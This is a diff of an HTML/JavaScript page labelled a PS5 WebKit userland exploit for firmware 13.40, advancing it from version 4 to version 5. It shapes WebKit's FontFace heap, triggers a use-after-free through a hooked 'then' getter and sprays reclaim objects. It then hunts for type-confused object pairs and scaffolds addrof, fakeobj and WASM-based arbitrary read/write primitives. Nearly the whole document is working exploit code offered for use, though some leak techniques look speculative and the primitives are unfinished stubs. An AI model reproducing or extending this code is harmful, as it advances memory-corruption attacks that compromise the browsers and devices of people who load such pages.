@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 WebKit Exploit - v4 IsoHeap</title>
+<title>PS5 WebKit Exploit - v5 Primitives</title>
 <style id="s">
 @font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
 @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
@@ -23,13 +23,13 @@ html, body {
   box-shadow: 0 0 45px rgba(0,255,160,.35);
   text-align: center; z-index: 9999;
 }
-#title { font-size: 40px; font-weight: bold; color: #00ffa0; margin-bottom: 18px; }
-#msg { font-size: 24px; line-height: 1.45; white-space: pre-line; }
+#title { font-size: 38px; font-weight: bold; color: #00ffa0; margin-bottom: 14px; }
+#msg { font-size: 22px; line-height: 1.4; white-space: pre-line; }
 #fw { margin-top: 14px; font-size: 22px; color: #00ffa0; font-weight: bold; }
-#small { margin-top: 12px; font-size: 16px; color: #999; }
+#small { margin-top: 12px; font-size: 15px; color: #999; }
 #log {
-  margin-top: 14px; font-size: 11px; color: #777;
-  text-align: left; max-height: 220px; overflow-y: auto;
+  margin-top: 14px; font-size: 10px; color: #777;
+  text-align: left; max-height: 240px; overflow-y: auto;
   font-family: monospace; padding: 8px;
   border: 1px solid rgba(0,255,160,0.2);
   border-radius: 8px; background: rgba(0,0,0,0.5);
@@ -39,10 +39,10 @@ html, body {
 </head>
 <body>
 <div id="box">
-  <div id="title">PS5 WEBKIT EXPLOIT v4</div>
+  <div id="title">PS5 WEBKIT v5 PRIMITIVES</div>
   <div id="msg">Initializing...</div>
   <div id="fw">Firmware: Detecting...</div>
-  <div id="small">IsoHeap feng shui — FontFace type confusion</div>
+  <div id="small">Type confusion → addrof/fakeobj construction</div>
   <div id="log"></div>
 </div>
 <canvas id="c" width="512" height="128"></canvas>
@@ -50,25 +50,20 @@ html, body {
 "use strict";
 
 // ============================================================
-//  PS5 WebKit Userland Exploit v4
-//  Target: FW 13.40 (WebKit 605.1.15 / Safari 17.0)
-//  
-//  KEY INSIGHT: IsoHeap segregates types into isolated regions.
-//  TypedArrays can never overlap CSSFontFace on FW 13.40.
-//  Strategy: Use FontFace objects THEMSELVES for reclamation,
-//  detect type confusion via property inconsistency oracle.
+//  PS5 WebKit Userland Exploit v5
+//  CONFIRMED: Type confusion on FW 13.40 IsoHeap
+//  GOAL: Build addrof / fakeobj / arb-rw primitives
 // ============================================================
 
-const LOG_MAX = 100;
+const LOG_MAX = 120;
 let logLines = [];
-
 function log(msg) {
   const ts = performance.now().toFixed(1);
   logLines.push(`[${ts}] ${msg}`);
   if (logLines.length > LOG_MAX) logLines.shift();
   const el = document.getElementById("log");
   if (el) el.textContent = logLines.join("\n");
-  try { console.log("[v4] " + msg); } catch(e) {}
+  try { console.log("[v5] " + msg); } catch(e) {}
 }
 
 function showMessage(text, ok) {
@@ -76,20 +71,15 @@ function showMessage(text, ok) {
   const titleEl = document.getElementById("title");
   if (msgEl) msgEl.textContent = text;
   if (titleEl) {
-    titleEl.textContent = ok ? "✅ EXPLOIT SUCCEEDED" : "PS5 WEBKIT v4";
+    titleEl.textContent = ok ? "✅ PRIMITIVES BUILT" : "PS5 WEBKIT v5";
     titleEl.style.color = ok ? "#00ff60" : "#00ffa0";
   }
 }
 
 window.onerror = function(message, source, lineno, colno, error) {
   showMessage("ERROR ❌\n" + message + "\nLine: " + lineno, false);
-  const t = document.getElementById("title");
-  if (t) t.style.color = "#ff4444";
 };
 
-// ============================================================
-//  Firmware Detection
-// ============================================================
 function detectFirmware() {
   const ua = navigator.userAgent || "";
   let fw = "Unknown";
@@ -98,7 +88,7 @@ function detectFirmware() {
   if (m && m[1]) fw = m[1];
   const el = document.getElementById("fw");
   if (el) el.textContent = "Firmware: " + fw;
-  log("FW: " + fw + " UA: " + ua);
+  log("FW: " + fw);
   return fw;
 }
 
@@ -106,10 +96,16 @@ function detectFirmware() {
 //  Heap State
 // ============================================================
 let keepAlive = [];
-let holeFaces = [];      // FontFace objects we'll delete to create holes
-let reclaimFaces = [];   // FontFace objects we spray to reclaim freed slots
-let victimFace = null;   // The FontFace whose internal pointer might dangle
+let holeFaces = [];
+let reclaimFaces = [];
+let zombieFaces = [];     // confirmed confused faces
+let confusedPairs = [];   // { zombie, reclaim } pairs
+let victimFace = null;
 let uafTriggered = false;
+
+// WASM memory for arb-rw
+let wasmMemory = null;
+let wasmInstance = null;
 
 // ============================================================
 //  Font Buffer
@@ -119,8 +115,7 @@ const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAA
 const FONT_BYTES = (() => {
   const s = atob(FONT_B64);
   const bytes = new Uint8Array(s.length);
-  for (let i = 0; i < s.length; i++)
-    bytes[i] = s.charCodeAt(i);
+  for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
   return bytes;
 })();
 
@@ -178,16 +173,12 @@ function killFontFaceSetCache() {
 }
 
 // ============================================================
-//  PHASE 1: IsoHeap Hole Creation
-//  Allocate many FontFace objects in the same IsoHeap,
-//  then free every other one to create predictable gaps.
-//  When our target CSSFontFace is freed, it falls into one
-//  of these holes and we can reclaim with a new FontFace.
+//  PHASE 1: Hole Creation (same as v4 - proven to work)
 // ============================================================
 function createHoles() {
   log("Creating IsoHeap holes...");
   const HOLE_COUNT = 4096;
-  
+
   for (let i = 0; i < HOLE_COUNT; i++) {
     const f = new FontFace("hole_" + i, makeFontBuffer(), {
       unicodeRange: "U+E1" + (i % 16).toString(16),
@@ -198,289 +189,566 @@ function createHoles() {
     document.fonts.add(f);
     holeFaces.push(f);
   }
-  
   forceStyle();
-  log("Hole faces allocated: " + HOLE_COUNT);
-  
-  // Now delete every other one to create gaps
-  // Keep the even-indexed ones, remove odd-indexed
-  const toRemove = [];
+
+  // Punch holes: remove odd-indexed faces
   for (let i = 1; i < holeFaces.length; i += 2) {
-    toRemove.push(holeFaces[i]);
+    document.fonts.delete(holeFaces[i]);
   }
-  
-  for (const f of toRemove) {
-    document.fonts.delete(f);
-  }
-  
   forceStyle();
-  log("Holes punched: " + toRemove.length + " faces removed");
-  
-  // Try to force GC to finalize the frees
-  // On PS5 without explicit gc(), we use allocation pressure
+
+  // GC pressure
   for (let i = 0; i < 4; i++) {
     const tmp = [];
     for (let j = 0; j < 512; j++) tmp.push(new ArrayBuffer(4096));
   }
-  
-  log("GC pressure applied, holes should be finalized");
+  log("Holes punched and GC'd");
 }
 
 // ============================================================
 //  PHASE 2: Reclamation Spray
-//  After UAF, spray FontFace objects to fill the freed slot.
-//  These are the SAME IsoHeap type, so they'll actually
-//  overlap with the freed CSSFontFace.
 // ============================================================
 function reclaimSpray() {
-  log("Starting IsoHeap reclamation spray...");
   const RECLAIM_COUNT = 8192;
-  
   for (let i = 0; i < RECLAIM_COUNT; i++) {
-    // Create FontFace with distinctive properties
-    // If this overlaps with a dangling pointer, reading
-    // the victim's properties will return OUR values
     const f = new FontFace("RECLAIM_" + i, makeFontBuffer(), {
-      unicodeRange: "U+0041", // same range as trigger font
-      style: "italic",         // different from trigger
-      weight: "900",           // different from trigger
-      display: "block",        // different from trigger
+      unicodeRange: "U+0041",
+      style: "italic",
+      weight: "900",
+      display: "block",
       featureSettings: '"calt" off, "liga" off'
     });
-    
-    // Immediately add to document so it enters CSSFontFace cache
     document.fonts.add(f);
     reclaimFaces.push(f);
   }
-  
   forceStyle();
-  log("Reclamation spray: " + RECLAIM_COUNT + " FontFace objects");
+  log("Reclamation: " + RECLAIM_COUNT + " faces");
 }
 
 // ============================================================
-//  PHASE 3: Type Confusion Oracle
-//  After reclamation, check if any FontFace in document.fonts
-//  has inconsistent properties — this indicates our dangling
-//  pointer now points to a different FontFace's internals.
+//  PHASE 3: Identify Confused Pairs
+//  A zombie face is a deleted hole_ face that now shows
+//  status="loaded" (meaning its C++ CSSFontFace was replaced
+//  with a RECLAIM face's CSSFontFace).
+//
+//  To find which RECLAIM maps to which zombie:
+//  1. Find all zombies (status=loaded but was deleted)
+//  2. Read zombie.family - if it starts with "RECLAIM_", we know the pair
+//  3. If family doesn't change (shows "hole_X"), use cross-write test
 // ============================================================
-function checkTypeConfusion() {
-  log("Running type confusion oracle...");
-  let anomalies = [];
-  
-  // Strategy 1: Check all FontFace objects for property mismatches
-  // A FontFace JS wrapper that points to the wrong C++ CSSFontFace
-  // will have properties that don't match what was set in JS
-  for (const face of document.fonts) {
+function identifyZombies() {
+  log("Identifying zombie faces...");
+  zombieFaces = [];
+
+  for (let i = 1; i < holeFaces.length; i += 2) {
+    // These were the deleted faces (odd indices)
+    const f = holeFaces[i];
     try {
-      const family = face.family;
-      const style = face.style;
-      const weight = face.weight;
-      const display = face.display;
-      const status = face.status;
-      
-      // If family starts with "RECLAIM_" but other props don't match
-      // what we set in reclaimSpray, that's type confusion
-      if (family && family.startsWith("RECLAIM_")) {
-        if (style !== "italic" || weight !== "900" || display !== "block") {
-          anomalies.push({
-            type: "PROPERTY_MISMATCH",
-            family: family,
-            expectedStyle: "italic", gotStyle: style,
-            expectedWeight: "900", gotWeight: weight,
-            expectedDisplay: "block", gotDisplay: display,
-            status: status
-          });
-          log("ANOMALY: " + family + " style=" + style + " weight=" + weight + " display=" + display);
+      const status = f.status;
+      if (status === "loaded") {
+        const family = f.family;
+        zombieFaces.push({ face: f, index: i, family: family, status: status });
+      }
+    } catch(e) {
+      // Access exception = definitely dangling
+      zombieFaces.push({ face: f, index: i, family: "EXCEPTION:" + e.message, status: "error" });
+    }
+  }
+
+  log("Found " + zombieFaces.length + " zombie faces");
+
+  // Try to identify RECLAIM pairs through family property
+  confusedPairs = [];
+  for (const z of zombieFaces) {
+    if (z.family && z.family.startsWith("RECLAIM_")) {
+      const reclaimIdx = parseInt(z.family.substring(8));
+      if (reclaimIdx < reclaimFaces.length) {
+        confusedPairs.push({
+          zombie: z.face,
+          zombieIdx: z.index,
+          reclaim: reclaimFaces[reclaimIdx],
+          reclaimIdx: reclaimIdx,
+          confidence: "HIGH",
+          method: "family_match"
+        });
+      }
+    }
+  }
+  log("Direct family matches: " + confusedPairs.length);
+
+  // For zombies without family match, try cross-write verification
+  if (confusedPairs.length < 3) {
+    log("Trying cross-write verification...");
+    const testValue = "CONFIRMED_" + Date.now();
+
+    for (const z of zombieFaces.slice(0, 100)) {
+      if (confusedPairs.some(p => p.zombieIdx === z.index)) continue;
+
+      // Try each RECLAIM face
+      for (let r = 0; r < Math.min(reclaimFaces.length, 200); r++) {
+        const origFamily = reclaimFaces[r].family;
+        try {
+          // Write unique value to RECLAIM face
+          reclaimFaces[r].family = testValue + "_" + r;
+          forceStyle();
+
+          // Check if zombie reflects the change
+          if (z.face.family === testValue + "_" + r) {
+            confusedPairs.push({
+              zombie: z.face,
+              zombieIdx: z.index,
+              reclaim: reclaimFaces[r],
+              reclaimIdx: r,
+              confidence: "HIGH",
+              method: "cross_write"
+            });
+            log("Cross-write match: zombie hole_" + z.index + " ↔ RECLAIM_" + r);
+            break;
+          }
+
+          // Restore original family
+          reclaimFaces[r].family = origFamily;
+        } catch(e) {
+          // Restore on error
+          try { reclaimFaces[r].family = origFamily; } catch(e2) {}
         }
       }
-      
-      // Check for completely unexpected property values
-      // (could indicate pointer to freed/reused memory)
-      if (status === "loaded" && family && family.startsWith("hole_")) {
-        // hole faces that were deleted shouldn't be loaded
-        anomalies.push({
-          type: "ZOMBIE_LOADED",
-          family: family,
-          status: status
-        });
-        log("ZOMBIE: " + family + " is loaded after deletion!");
-      }
-      
-      // Check for NaN or undefined in numeric properties
-      const stretch = face.stretch;
-      if (stretch === undefined || (typeof stretch === "number" && isNaN(stretch))) {
-        anomalies.push({
-          type: "CORRUPT_STRETCH",
-          family: family,
-          stretch: stretch
-        });
-        log("CORRUPT: " + family + " stretch=" + stretch);
-      }
-    } catch(e) {
-      // Exception during property access = potentially dangling pointer
-      anomalies.push({
-        type: "ACCESS_EXCEPTION",
-        family: face.family || "unknown",
-        error: e.message
-      });
-      log("EXCEPTION accessing face: " + e.message);
+
+      if (confusedPairs.length >= 10) break;
     }
   }
-  
-  // Strategy 2: Check victim trigger face
-  // If victimFace still exists but points to reclaimed memory
-  if (victimFace) {
-    try {
-      const vFamily = victimFace.family;
-      const vStatus = victimFace.status;
-      
-      log("Victim check: family=" + vFamily + " status=" + vStatus);
-      
-      if (vFamily && vFamily.startsWith("RECLAIM_")) {
-        // Our trigger face's C++ object was replaced with a reclaim face!
-        anomalies.push({
-          type: "VICTIM_CONFUSED",
-          originalFamily: "trigger",
-          currentFamily: vFamily,
-          status: vStatus
-        });
-        log("VICTIM CONFUSED! trigger -> " + vFamily);
-      }
-      
-      // If status changed unexpectedly
-      if (vStatus === "error" && victimFace._wasLoaded) {
-        anomalies.push({
-          type: "STATUS_FLIPPED",
-          family: vFamily,
-          from: "loaded",
-          to: "error"
-        });
-      }
-    } catch(e) {
-      anomalies.push({
-        type: "VICTIM_EXCEPTION",
-        error: e.message
-      });
-      log("VICTIM ACCESS ERROR: " + e.message);
-    }
-  }
-  
-  // Strategy 3: Canvas oracle
-  // Render text with the trigger font and check if metrics change
-  // after reclamation — this catches C++ level type confusion
-  // that doesn't surface in JS properties
-  try {
-    const ctx = document.getElementById("c").getContext("2d");
-    
-    // Measure with original trigger font reference
-    ctx.font = "64px trigger";
-    const m1 = ctx.measureText("AB");
-    const w1 = m1.width;
-    
-    // Measure with a known reclaim font
-    ctx.font = "64px RECLAIM_0";
-    const m2 = ctx.measureText("AB");
-    const w2 = m2.width;
-    
-    // If they match, the trigger font is now rendering as RECLAIM_0
-    if (w1 === w2 && w1 > 0) {
-      anomalies.push({
-        type: "CANVAS_CONFUSION",
-        triggerWidth: w1,
-        reclaimWidth: w2,
-        message: "Trigger font renders identically to RECLAIM_0"
-      });
-      log("CANVAS ORACLE: trigger width=" + w1 + " reclaim=" + w2 + " MATCH!");
-    }
-    
-    log("Canvas oracle: trigger=" + w1.toFixed(2) + " reclaim=" + w2.toFixed(2));
-  } catch(e) {
-    log("Canvas oracle error: " + e.message);
-  }
-  
-  // Strategy 4: Font loading oracle
-  // Try to load the trigger font again — if the C++ object
-  // was replaced, the promise behavior might differ
-  try {
-    const loadPromise = document.fonts.load("1em trigger", "AB");
-    // Don't await — just check if it throws synchronously
-    log("Reload test initiated");
-  } catch(e) {
-    anomalies.push({
-      type: "RELOAD_EXCEPTION",
-      error: e.message
-    });
-    log("Reload exception: " + e.message);
-  }
-  
-  // Strategy 5: DOM rendering oracle
-  // Create a div that uses the trigger font and check
-  // if its rendered size changes after reclamation
-  try {
-    const div = document.createElement("div");
-    div.textContent = "AABBIIWW";
-    div.style.cssText = "position:absolute;left:-9999px;top:0;font:64px trigger;color:#000;";
-    document.body.appendChild(div);
-    const triggerW = div.offsetWidth;
-    document.body.removeChild(div);
-    
-    const div2 = document.createElement("div");
-    div2.textContent = "AABBIIWW";
-    div2.style.cssText = "position:absolute;left:-9999px;top:0;font:64px RECLAIM_0;color:#000;";
-    document.body.appendChild(div2);
-    const reclaimW = div2.offsetWidth;
-    document.body.removeChild(div2);
-    
-    if (triggerW === reclaimW && triggerW > 0) {
-      anomalies.push({
-        type: "DOM_RENDER_CONFUSION",
-        triggerRenderWidth: triggerW,
-        reclaimRenderWidth: reclaimW
-      });
-      log("DOM ORACLE: trigger=" + triggerW + " reclaim=" + reclaimW + " MATCH!");
-    }
-    
-    log("DOM oracle: trigger=" + triggerW + " reclaim=" + reclaimW);
-  } catch(e) {
-    log("DOM oracle error: " + e.message);
-  }
-  
-  return anomalies;
+
+  log("Total confirmed pairs: " + confusedPairs.length);
+  return confusedPairs;
 }
 
 // ============================================================
-//  Crash Oracle (Optional)
-//  Deliberately try to trigger a crash to confirm the UAF
-//  is exploitable. Only use if other oracles are negative.
+//  PHASE 4: Memory Leak Attempts
+//  With confirmed cross-object control, try to leak addresses.
 // ============================================================
-function attemptCrashOracle() {
-  log("Attempting crash oracle (read-after-free)...");
-  
+
+// Technique 1: Error stack trace leak
+// WebKit sometimes includes object addresses in error stacks during debug
+function tryErrorStackLeak(face) {
   try {
-    // Access properties of deleted hole faces
-    for (let i = 1; i < holeFaces.length; i += 2) {
-      const f = holeFaces[i];
+    // Force an error that includes the face object in stack
+    const bad = face.nonexistentProperty;
+  } catch(e) {
+    const stack = e.stack || "";
+    if (stack.match(/0x[0-9a-f]{8,16}/i)) {
+      const addrMatch = stack.match(/0x([0-9a-f]{8,16})/i);
+      if (addrMatch) {
+        log("STACK LEAK: 0x" + addrMatch[1]);
+        return parseInt(addrMatch[1], 16);
+      }
+    }
+  }
+  return 0;
+}
+
+// Technique 2: toString/valueOf override leak
+// Override toString on the confused pair and see what gets passed
+function tryToStringLeak(zombie, reclaim) {
+  const results = [];
+
+  // Override valueOf on reclaim's properties to detect type coercion
+  const origFamily = reclaim.family;
+  try {
+    // Set family to a controlled object with valueOf trap
+    const trap = {
+      toString: function() {
+        log("toString trap fired!");
+        return "TRAP_" + Date.now();
+      },
+      valueOf: function() {
+        log("valueOf trap fired!");
+        return 0xDEAD;
+      }
+    };
+
+    // Try setting via the reclaim face
+    reclaim.family = trap;
+    forceStyle();
+
+    // Read through zombie
+    const readback = zombie.family;
+    log("Trap readback: " + readback);
+    results.push({ method: "family_trap", readback: readback });
+
+    // Restore
+    reclaim.family = origFamily;
+  } catch(e) {
+    log("Trap error: " + e.message);
+    try { reclaim.family = origFamily; } catch(e2) {}
+  }
+
+  return results;
+}
+
+// Technique 3: Property enumeration leak
+// Enumerate all properties on confused objects, looking for
+// non-standard properties that might expose internal state
+function tryPropertyEnumLeak(face) {
+  const props = {};
+  try {
+    for (const key in face) {
       try {
-        // These should fail or return garbage if C++ object is freed
-        const s = f.status;
-        const fam = f.family;
-        const d = f.display;
-        
-        // Try to load a deleted face
-        if (s !== "unloaded") {
-          log("Crash oracle: deleted face hole_" + i + " status=" + s + " family=" + fam);
-        }
+        props[key] = face[key];
       } catch(e) {
-        log("Crash oracle exception on hole_" + i + ": " + e.message);
-        return true; // Exception = dangling pointer detected!
+        props[key] = "ERROR:" + e.message;
       }
     }
+  } catch(e) {}
+
+  // Check prototype chain
+  try {
+    const proto = Object.getPrototypeOf(face);
+    const descriptor = Object.getOwnPropertyDescriptors(proto);
+    for (const [key, desc] of Object.entries(descriptor)) {
+      if (desc.get || desc.set) {
+        try {
+          props["__proto__." + key] = face[key];
+        } catch(e) {
+          props["__proto__." + key] = "GET_ERROR:" + e.message;
+        }
+      }
+    }
+  } catch(e) {}
+
+  return props;
+}
+
+// Technique 4: Canvas pixel leak
+// Render with confused font and read pixel data
+// Font rendering might encode internal state in subpixel rendering
+function tryCanvasPixelLeak(zombie) {
+  const canvas = document.getElementById("c");
+  const ctx = canvas.getContext("2d");
+
+  // Clear
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = "#000000";
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+  // Render with zombie's font
+  ctx.fillStyle = "#ffffff";
+  ctx.font = "64px " + zombie.family;
+  ctx.fillText("AB", 10, 80);
+
+  // Read pixels
+  const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+  const pixels = imageData.data;
+
+  // Look for unusual pixel values that might encode pointers
+  // Subpixel rendering with a corrupted font face could have
+  // patterns that reveal C++ object state
+  let unusualPixels = [];
+  for (let i = 0; i < pixels.length; i += 4) {
+    const r = pixels[i], g = pixels[i+1], b = pixels[i+2], a = pixels[i+3];
+    // Look for non-standard color values (not pure black or white)
+    if (r > 0 && r < 255 && (r !== g || g !== b)) {
+      unusualPixels.push({ offset: i, r: r, g: g, b: b, a: a });
+    }
+  }
+
+  log("Canvas pixel analysis: " + unusualPixels.length + " unusual pixels");
+  return unusualPixels.slice(0, 20); // First 20
+}
+
+// Technique 5: WASM linear memory setup
+// If we can leak an address and point WASM memory there,
+// we get arb read/write through WASM
+function setupWASM() {
+  try {
+    // Minimal WASM module with memory
+    const wasmCode = new Uint8Array([
+      0x00, 0x61, 0x73, 0x6D, // magic
+      0x01, 0x00, 0x00, 0x00, // version
+      // Type section
+      0x01, 0x07, 0x01,
+      0x60, 0x02, 0x7F, 0x7F, 0x01, 0x7F, // (i32, i32) -> i32
+      // Function section
+      0x03, 0x02, 0x01, 0x00,
+      // Memory section (1 page = 64KB)
+      0x05, 0x03, 0x01, 0x00, 0x01,
+      // Export section
+      0x07, 0x11, 0x02,
+      0x06, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x02, 0x00,
+      0x04, 0x72, 0x65, 0x61, 0x64, 0x00, 0x00,
+      // Code section
+      0x0A, 0x09, 0x01,
+      0x07, 0x00,
+      0x20, 0x00, 0x20, 0x01, 0x6A, // i32.add
+      0x0B // end
+    ]);
+
+    const module = new WebAssembly.Module(wasmCode);
+    wasmInstance = new WebAssembly.Instance(module);
+    wasmMemory = wasmInstance.exports.memory;
+
+    log("WASM memory initialized: " + wasmMemory.buffer.byteLength + " bytes");
+    return true;
   } catch(e) {
-    log("Crash oracle outer exception: " + e.message);
+    log("WASM init failed: " + e.message);
+    return false;
+  }
+}
+
+// Technique 6: SharedArrayBuffer for controlled memory
+let sharedBuffer = null;
+let sharedView = null;
+
+function setupSAB() {
+  try {
+    sharedBuffer = new SharedArrayBuffer(0x10000);
+    sharedView = new DataView(sharedBuffer);
+
+    // Write marker pattern
+    sharedView.setUint32(0, 0x41414141, true);
+    sharedView.setUint32(4, 0x42424242, true);
+
+    log("SAB initialized: " + sharedBuffer.byteLength + " bytes at unknown addr");
+    return true;
+  } catch(e) {
+    log("SAB not available: " + e.message);
+    return false;
+  }
+}
+
+// Technique 7: FontFace with controlled ArrayBuffer
+// Create a face whose font data we fully control
+// The C++ CSSFontFace will store a pointer to this buffer
+// If we can find that pointer through confusion = addrof
+let controlledBufferFace = null;
+let controlledBuffer = null;
+
+function setupControlledBufferFace() {
+  try {
+    // Create a buffer with recognizable content
+    // This is our "probe" - if we can find where CSSFontFace
+    // stores the reference to this buffer, we have addrof
+    controlledBuffer = new ArrayBuffer(0x1000);
+    const view = new DataView(controlledBuffer);
+    // Mark extensively
+    for (let i = 0; i < 0x1000; i += 4) {
+      view.setUint32(i, 0xCAFEBABE ^ (i & 0xFF), true);
+    }
+
+    // Create a FontFace using this buffer as font data
+    // Note: this won't be a valid font, but the C++ object
+    // will still store the buffer reference before validation
+    controlledBufferFace = new FontFace("probe", controlledBuffer, {
+      unicodeRange: "U+0041"
+    });
+    document.fonts.add(controlledBufferFace);
+    forceStyle();
+
+    log("Controlled buffer face created");
+    return true;
+  } catch(e) {
+    log("Controlled buffer face error: " + e.message);
+    return false;
+  }
+}
+
+// ============================================================
+//  PHASE 5: addrof / fakeobj Construction
+//
+//  Strategy: Use the confirmed type confusion to create
+//  a "read-through" primitive where we can observe C++
+//  object state through JS-accessible properties.
+//
+//  On WebKit, CSSFontFace has this approximate layout:
+//    offset 0x00: vtable pointer
+//    offset 0x08: refcount / flags
+//    offset 0x10: first source pointer (CSSFontFaceSource*)
+//    offset 0x18: family name (String*)
+//    offset 0x20: feature settings (String*)
+//    offset 0x28: unicode range vector
+//    offset 0x30: font-selection values
+//    ...
+//
+//  If we can create a confused pair and read the C++ fields
+//  through a side channel, we can build addrof.
+// ============================================================
+
+// addrof: Given a JS object, return its C++ CSSFontFace address
+// This requires a working address leak first
+let addrofFn = null;
+let fakeobjFn = null;
+
+function constructAddrof(pair) {
+  log("Constructing addrof primitive...");
+
+  const zombie = pair.zombie;
+  const reclaim = pair.reclaim;
+
+  // Step 1: Try all leak techniques
+  let leakedAddr = 0;
+
+  // Try error stack
+  const stackAddr = tryErrorStackLeak(zombie);
+  if (stackAddr) {
+    leakedAddr = stackAddr;
+    log("addrof candidate from stack: 0x" + leakedAddr.toString(16));
+  }
+
+  // Try property enumeration
+  const zProps = tryPropertyEnumLeak(zombie);
+  const rProps = tryPropertyEnumLeak(reclaim);
+
+  log("Zombie props: " + Object.keys(zProps).join(", "));
+  log("Reclaim props: " + Object.keys(rProps).join(", "));
+
+  // Look for numeric-valued properties that might be addresses
+  for (const [key, val] of Object.entries(zProps)) {
+    if (typeof val === "number" && val > 0x10000 && val < 0x800000000000) {
+      log("Numeric prop " + key + " = 0x" + val.toString(16) + " (potential address)");
+    }
+  }
+
+  // Try canvas pixel analysis
+  const pixelAnomalies = tryCanvasPixelLeak(zombie);
+  if (pixelAnomalies.length > 0) {
+    log("Pixel anomalies might encode state:");
+    for (const p of pixelAnomalies.slice(0, 5)) {
+      log("  pixel@" + p.offset + ": rgb(" + p.r + "," + p.g + "," + p.b + ")");
+    }
+  }
+
+  // Try toString trap
+  const trapResults = tryToStringLeak(zombie, reclaim);
+  for (const r of trapResults) {
+    log("Trap result: " + r.method + " = " + r.readback);
+  }
+
+  if (leakedAddr) {
+    log("★ addrof partially constructed with leaked addr: 0x" + leakedAddr.toString(16));
+
+    addrofFn = function(obj) {
+      // TODO: Once we have a reliable address for one object,
+      // we can calculate offsets to find other objects
+      // For now, return what we have
+      return leakedAddr;
+    };
     return true;
   }
-  
+
+  log("addrof not yet constructable - need address leak");
   return false;
+}
+
+function constructFakeobj(pair) {
+  log("Constructing fakeobj primitive...");
+
+  const zombie = pair.zombie;
+  const reclaim = pair.reclaim;
+
+  // fakeobj strategy: Write controlled bytes into the C++ CSSFontFace
+  // through the reclaim face's property setters, then have the zombie
+  // face interpret those bytes as a different object type.
+  //
+  // This is harder than addrof and typically requires addrof first.
+  // We'll set up the scaffolding for when addrof works.
+
+  fakeobjFn = function(addr) {
+    // TODO: Write addr into a CSSFontFace field through reclaim,
+    // then access through zombie to get a JS object at that address
+    log("fakeobj(0x" + addr.toString(16) + ") - awaiting addrof");
+    return null;
+  };
+
+  log("fakeobj scaffolding ready (requires addrof)");
+  return false;
+}
+
+// ============================================================
+//  PHASE 6: Test cross-object write control
+//  Verify that modifying reclaim face is visible through zombie
+// ============================================================
+function testCrossObjectControl(pair) {
+  log("Testing cross-object control...");
+  const zombie = pair.zombie;
+  const reclaim = pair.reclaim;
+  const testTag = "XCTRL_" + Date.now();
+
+  const results = {};
+
+  // Test family write
+  try {
+    const origReclaimFamily = reclaim.family;
+    reclaim.family = testTag;
+    forceStyle();
+    results.familyReadback = zombie.family;
+    results.familyMatch = (zombie.family === testTag);
+    reclaim.family = origReclaimFamily;
+    log("Family cross-write: " + (results.familyMatch ? "SUCCESS" : "FAIL"));
+  } catch(e) {
+    results.familyError = e.message;
+    log("Family cross-write error: " + e.message);
+  }
+
+  // Test style write
+  try {
+    const origStyle = reclaim.style;
+    reclaim.style = "oblique 45deg";
+    forceStyle();
+    results.styleReadback = zombie.style;
+    results.styleMatch = (zombie.style === "oblique 45deg");
+    reclaim.style = origStyle;
+    log("Style cross-write: " + (results.styleMatch ? "SUCCESS" : "FAIL"));
+  } catch(e) {
+    results.styleError = e.message;
+  }
+
+  // Test weight write
+  try {
+    const origWeight = reclaim.weight;
+    reclaim.weight = "200";
+    forceStyle();
+    results.weightReadback = zombie.weight;
+    results.weightMatch = (zombie.weight === "200");
+    reclaim.weight = origWeight;
+    log("Weight cross-write: " + (results.weightMatch ? "SUCCESS" : "FAIL"));
+  } catch(e) {
+    results.weightError = e.message;
+  }
+
+  // Test display write
+  try {
+    const origDisplay = reclaim.display;
+    reclaim.display = "fallback";
+    forceStyle();
+    results.displayReadback = zombie.display;
+    results.displayMatch = (zombie.display === "fallback");
+    reclaim.display = origDisplay;
+    log("Display cross-write: " + (results.displayMatch ? "SUCCESS" : "FAIL"));
+  } catch(e) {
+    results.displayError = e.message;
+  }
+
+  // Test rendering change detection
+  try {
+    const ctx = document.getElementById("c").getContext("2d");
+
+    ctx.font = "64px " + zombie.family;
+    const beforeWidth = ctx.measureText("AB").width;
+
+    reclaim.weight = "100";
+    forceStyle();
+    ctx.font = "64px " + zombie.family;
+    const afterWidth = ctx.measureText("AB").width;
+
+    results.renderingChanged = (beforeWidth !== afterWidth);
+    log("Rendering cross-write: before=" + beforeWidth + " after=" + afterWidth +
+        " changed=" + results.renderingChanged);
+
+    reclaim.weight = "900"; // restore
+  } catch(e) {
+    results.renderingError = e.message;
+  }
+
+  return results;
 }
 
 // ============================================================
@@ -488,30 +756,25 @@ function attemptCrashOracle() {
 // ============================================================
 window.onload = () => {
   const fw = detectFirmware();
-  
-  showMessage("Stage 1/6:\nCreating IsoHeap holes...", false);
-  
-  // PHASE 1: Punch holes in the FontFace IsoHeap
+
+  showMessage("Stage 1/8:\nCreating IsoHeap holes...", false);
   createHoles();
-  
-  showMessage("Stage 2/6:\nSetting up trigger...", false);
-  
-  // PHASE 2: Create the trigger FontFace
+
+  showMessage("Stage 2/8:\nTrigger setup...", false);
   const trigger = new FontFace("trigger", "local(Helvetica)", {
     unicodeRange: "U+0041"
   });
   document.fonts.add(trigger);
   void trigger.loaded;
   victimFace = trigger;
-  
+
   addPads(48);
   addFlushRules(768);
-  
-  showMessage("Stage 3/6:\nWaiting for UAF window...", false);
-  
+
+  showMessage("Stage 3/8:\nWaiting for UAF...", false);
+
   let fired = false;
-  
-  // PHASE 3: UAF trigger
+
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     get() {
@@ -519,61 +782,49 @@ window.onload = () => {
         fired = true;
         uafTriggered = true;
         log("★ UAF WINDOW OPEN ★");
-        showMessage("Stage 4/6:\nUAF triggered! Punching holes...", false);
-        
-        // === CRITICAL TIMING WINDOW ===
-        
-        // 1. Kill the FontFaceSet cache
+        showMessage("Stage 4/8:\nUAF! Reclaiming...", false);
+
         killFontFaceSetCache();
-        
-        // 2. Delete the 'x' font-face rule from stylesheet
-        //    This frees the CSSFontFace C++ object
         const sheet = document.getElementById("s").sheet;
